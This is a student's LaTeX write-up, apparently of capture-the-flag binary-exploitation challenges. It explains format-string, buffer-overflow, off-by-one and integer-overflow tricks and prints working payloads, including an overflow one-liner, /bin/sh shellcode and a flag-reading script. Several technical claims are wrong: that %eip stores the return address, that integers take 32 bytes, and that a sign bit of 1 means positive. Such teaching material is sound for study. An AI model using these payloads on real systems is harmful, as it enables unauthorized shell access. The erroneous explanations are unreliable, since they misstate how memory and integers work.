@@ -1,0 +1,277 @@
+\documentclass [12 pt, twoside] {article}
+\usepackage[margin=1in]{geometry}
+\usepackage[utf8]{inputenc}
+\usepackage{listings}
+\usepackage{color}
+\usepackage{setspace}
+\usepackage{tipa}
+
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codeblue}{rgb}{0,0,0.6}
+\definecolor{backcolor}{rgb}{0.95,0.95,0.95}
+
+\lstdefinestyle{mystyle}{
+	backgroundcolor = \color{backcolor},
+	commentstyle = \color{codeblue},
+	keywordstyle = \color{codegreen},
+	numberstyle = \color{codegray},
+	stringstyle = \color{magenta},
+	basicstyle = \footnotesize,
+	breakatwhitespace = false,
+	breaklines = true,
+	captionpos = b,
+	keepspaces = true,
+	numbers = left,
+	numbersep = 5pt,
+	showspaces = false,
+	showstringspaces = false,
+	showtabs = false,
+	tabsize = 4
+}
+
+\lstset{style = mystyle}
+
+\begin{document}
+\title{Notes on Introductory Binary Exploit}
+\author{Yicheng Wang}
+\date{2014-11-10}
+\maketitle
+
+\section{The idea of a stack}
+
+When the following program runs, when the machine encounters fred(i), it will need to take a detour
+away from the main function into the function fred, but after fred returns, it will need to go back
+to the main function. The way the machine does this is by pushing the memory address of the next line
+in the main program (i.e. printf("\%s",name);) onto what is known as a stack, or a temporary storage
+device. This way, when fred finished running, the main function can continue as before. The return
+address is saved in the register \%eip of the program. Note that the machine will try to go ahead and call
+whatever is stored in \%eip, so if there is a non-existing address, it will return an error.
+
+\begin{lstlisting}[language=C++]
+...
+int i = 3;
+char name[3];
+
+fred(i);
+printf("%s",name);
+...
+...
+void fred(int i) {
+...
+}
+\end{lstlisting}
+
+
+\section{Format and Guess -- Format Sting Exploit}
+
+
+This is a bug that is much easier to prevent than buffer overflow and occurs a lot less frequently.
+This is a bug caused by bad programming in something like the following:
+\begin{lstlisting}[language=C++]
+#include<stdio.h>
+
+int main(int argc, char **argv) {
+	printf(argv);
+	return 0;
+}
+\end{lstlisting}
+
+
+Of course this is a simplification, but the gist is that the program prints an user-input string
+without checking its content. Therefore the user can insert string formatting tokens such as \%x,
+\%s, and \%n to read and write at certain memory locations, as exemplified below.
+
+\subsection{Guess}
+
+
+This was the easier question IMO, mainly because all one needed to do is to know what the secret is.
+In the source code, a blantant source of exploit is on line 19 when it prints your name
+without checking its content. This gives you an opportunity to use a clever name to
+know the secret. The format token \%x can be used to leak the memory addresses on the stack
+and therefore get knowledge as to what the secret is. The name should consists of several
+\%08x.'s, the dots are in place to seperate different memory addresses. Run a few times,
+the thing that changes is secret (because that is the only parameter that differs from run to run)
+and then enter the secret!
+
+
+\subsection{Format}
+
+
+This question to me was harder because it requires the use of 3 format tokens and
+required the user to write into the stack directly. In this program, the vulnerability
+lies within line 15, where it prints the user input without any checking. We need to first
+discover the location of secret on the stack. To do this, we can use the \%08x in combination
+with the \%s operator. The \%s operator prints  the thing that is currently on the top of the stack as a string,
+while the \%08x operator pop 8 things off of the string at a time. Therefore we just
+increase the amount of \%08x. from \%08x.\%s until \%s returns null instead of some
+non-ascii character.
+
+
+When \%s returns null, it means that we've reach the memory location of secrets, this
+is where \%n comes in. The token \%n writes onto the current memory location the amount
+of bytes that has already been entered. Therefore, when \%s returns null, substitute
+it with \%n and rearrange the coefficients of \%x such that they sum up to 1337 - number-of-x's.
+That should start a shell!
+\section{Overflow 1 and 2 -- The basics of overflowing}
+\subsection{Overflow 1}
+First off, the source code:
+\begin{lstlisting}[language=C++]
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+void give_shell(){
+	gid_t gid = getegid();
+	setresgid(gid, gid, gid);
+	system("/bin/sh -i");
+}
+
+void vuln(char *input){ 
+	char buf[16];
+	int secret = 0;
+	strcpy(buf, input);
+	if (secret == 0xc0deface) {
+		give_shell();
+	}
+	else {
+		printf("The secret is %x\n", secret);
+	}
+}
+
+int main(int argc, char **argv) {
+	if (argc > 1)
+		vuln(argv[1]);
+	return 0;
+}
+\end{lstlisting}
+
+
+What's nice about this problem is that it provides you with a stack diagram. Therefore
+one only needs to craft something that would overflow the buffer and overwrite secrets.
+Buffer is 16 bytes, so the first 16 bytes of the input string determines the content of
+buffer, this doesn't matter so we can fill this part up with garbage. The next four bytes
+determine the value of secrets. It is important to note that this machine uses little
+endian system and therefore the desirable value should be entered backwards, i.e. "	\textbackslash xce\textbackslash xfa\textbackslash xde\textbackslash xc0"
+instead of "\textbackslash xc0\textbackslash xde\textbackslash xfa\textbackslash xce". To craft this ascii string, one tool we can use is scripting
+languages such as pythong. Therefore just type the following into the cmd and you'll be home free!
+\$ python -c 'print "A"*16 + "\textbackslash xce\textbackslash xfa\textbackslash xde\textbackslash xc0"' \textpipe ./overflow1
+
+
+That will crack open a shell!
+\subsection{Overfow 2}
+
+
+Pretty much the same as Overflow 1, with a few exceptions:
+\begin{enumerate}
+	\item This problem uses the fact that \%eip points to the memory address of the function that is "next-in-line."
+	\item We need to find the memory address of give\_shell(), which can be done using 'objdump -d ./overflow2 \textpipe grep "give\_shell"'
+\end{enumerate}
+The rest will be left as an exercise to the reader!
+
+
+\section{Misellaneous Questions -- ExecuteMe and OBO and Netsino}
+
+
+ExecuteMe and OBO are two troll questions... IMO they worth a lot more than 80 and 90 points,
+can be easily put into the scales of Netsino (i.e. around 120).
+More than anything these three problems tests your basic understanding of C and memory stuff.
+I have no idea where to put them so here!
+
+\subsection{ExecuteMe}
+
+
+I still have no idea how this thing compiled...
+
+
+That being said, I did have an idea of what it should do. Basically it takes the input string
+and casts it as a void function pointer. Therefore the string should be made up of "opcodes,"
+or operation codes. These are the hex numbers that acutally encode what the processor would do.
+Therefore the obvious thing to do is put in an opcode that would open up a shell, they can be found
+in abundance here: http://shell-storm.org/shellcode/
+
+
+The shellcode I used for this one is here:
+\begin{lstlisting}
+\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80
+\end{lstlisting}
+
+However, there is one small problem, we would like to use the shell, therefore it is necessary
+to keep stdin open. We do this using the unix "cat" command. Therefore, the real thing is as follows:
+\begin{lstlisting}
+$ cat <(python -c 'print "\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80"') - | ./execute
+\end{lstlisting}
+
+
+\subsection{OBO}
+
+
+This problem is a very troll problem. First thing that is noticable is the amount of out-of-bound
+errors this guy is making. One should not use less than or equal to in a for loop with the size of
+the array as the parameter. Therefore you see that "G" and "g" are assigned values of 16, ":" is
+assigned the value of 10, same as "a," while hex\_table[256] is assigned -1 (The f**k??)
+
+
+The reason why this thing compiles despite its blatant out-of-bound errors is the way C functions.
+When an index that is out of bounds is called, C just pretends the array goes on and on and assigns
+a value to where this "element" of the array is supposed to be. Therefore, hex\_table[256] is just
+some random memory address 8 bytes after the last element of hex\_table.
+
+
+The use of this out-of-range "assignment" comes when the program checks for the "complexity" of your
+new password. It assigns the hex value's index to 1 if that character is present. Curiously enough,
+what if "g" or "G" was in your data stream? And a simple test shows that they will overwrite digits[16]
+to be 1! However, as we see in the declaration of variables, password is right after digits! That means
+by adding a bunch og "g"'s to your new password, it'll rewrite the old password to "\textbackslash x01"
+and give you access to change password.py.
+
+
+This should work right? BUT NO!! This is what you get:
+\begin{lstlisting}
+$ { python -c 'print "0123456789abcdefg"' ; python -c 'print "\x01"' ; } | ./obo 
+New password: Confirm old password: Not yet implemented.
+Password changed!
+\end{lstlisting}
+
+
+The heck??? Turns out set\_password.py just prints out "Not yet implemented."
+
+
+Here's the troll part, since set\_password.py gets full admin access, the trick
+is to create your own set\_password.py in the home directory and run the whole thing
+from there. Your own set\_password.py includes opening flag.txt, reading it and
+printing out the results, it should end up looking like this:
+\begin{lstlisting}[language=python]
+#!/usr/bin/python
+
+f = open("/home/obo/flag.txt","r").read()
+
+print f
+\end{lstlisting}
+
+And the final command line execution:
+
+\begin{lstlisting}
+~$ { python -c 'print "0123456789abcdefg"' ; python -c 'print "\x01"' ; } | /home/obo/obo
+\end{lstlisting}
+
+That should work.
+
+
+\subsection{Netsino}
+
+
+As scary as this one looks, it's not that bad. The trick here is the idea of integer overflow.
+The bet is a positive long integer, but as we know, integers wrap around because there are
+only 32 bytes allocated for each integer. The first byte is called a sign-byte, if it's 1,
+the number is positive, else, it's negative. Therefore the largest allowable number
+is $2^{31} - 1$ (because the existance of 0), everything greater than that will wrap around into the realm of negatives.
+
+
+For example, $2^{31}$ will actually return $-(2^{31})$ because it wraps around.
+
+
+The trick to this problem is precisely that, enter a huge number, lose, and let the boss
+pay the debt, happy gambling! :D
+
+\end{document}
